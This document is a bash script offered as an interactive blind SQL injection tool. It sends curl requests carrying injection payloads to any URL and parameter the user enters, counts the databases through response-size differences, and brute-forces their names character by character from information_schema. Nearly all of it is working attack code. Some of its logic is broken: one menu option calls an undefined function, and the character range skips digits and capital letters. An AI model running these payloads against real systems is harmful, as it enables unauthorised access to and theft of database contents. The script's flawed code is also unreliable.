#!/bin/bash

echo "Welcome to the Blind SQL Injection Tool"
echo "---------------------------------------"
echo "1. Find the number of databases"
echo "2. Brute force the database names"
echo "3. Find the number and brute force the database names"
echo "Select an option: "
read -r ACTION

echo "Select HTTP method:"
echo "1. GET"
echo "2. POST"
read -r METHOD_CHOICE

METHOD="GET"
[[ "$METHOD_CHOICE" -eq 2 ]] && METHOD="POST"

echo "Enter the target URL: "
read -r URL

echo "Enter the parameter to test (e.g., id): "
read -r PARAMETER

send_request() {
    local query="$1"
    local injection="${PARAMETER}=${query}"
    if [ "$METHOD" == "POST" ]; then
        curl -s -X POST --data "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
    else
        curl -s -G --data-urlencode "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
    fi
}

extract_length() {
    local test_length
    local length
    local response_lengths=()
    local significant_difference=10
    local base_length=$(send_request "1' and '1'='2" -- -)

    for length in {1..20}; do
        test_length=$(send_request "1' or (select count(schema_name) from information_schema.schemata)=$length-- -")
        response_lengths[$length]=$test_length

        if [ "$test_length" -ne "$base_length" ]; then
            echo $length
            return 0
        fi
    done
    echo 0
    return 0
}

brute_force_db_names() {
    local number_of_databases=$1
    local db_name
    local current_length
    local reference_length=$(send_request "1' and '1'='2" -- -)

    for ((db_index=1; db_index<=number_of_databases; db_index++)); do
        db_name=""
        local position=1
        echo "Brute forcing the name of database $db_index..."
        while : ; do
            local found_char=false
            for ascii in {91..127}; do
                local char=$(printf \\$(printf '%03o' $ascii))
                local query="1' or substring((select schema_name from information_schema.schemata order by schema_name limit $((db_index - 1)),1),$position,1)='$char' -- -"
                current_length=$(send_request "$query")
                if [[ "$current_length" -ne "$reference_length" ]]; then
                    db_name+="$char"
                    echo -n "$char"
                    found_char=true
                    break
                fi
            done
            if ! $found_char; then
                echo -e "\nFinished brute-forcing database $db_index name: $db_name"
                break
            fi
            ((position++))
        done
    done
}

list_items() {
    case "$ACTION" in
        1)
            extract_length
            ;;
        2)
            local num_dbs=$(extract_length)
            if [ "$num_dbs" -gt 0 ]; then
                brute_force_db_names "$num_dbs"
            else
                echo "Failed to find the number of databases."
            fi
            ;;
        3)
            brute_force_all
            ;;
        *)
            echo "Invalid option."
            exit 1
            ;;
    esac
}

list_items

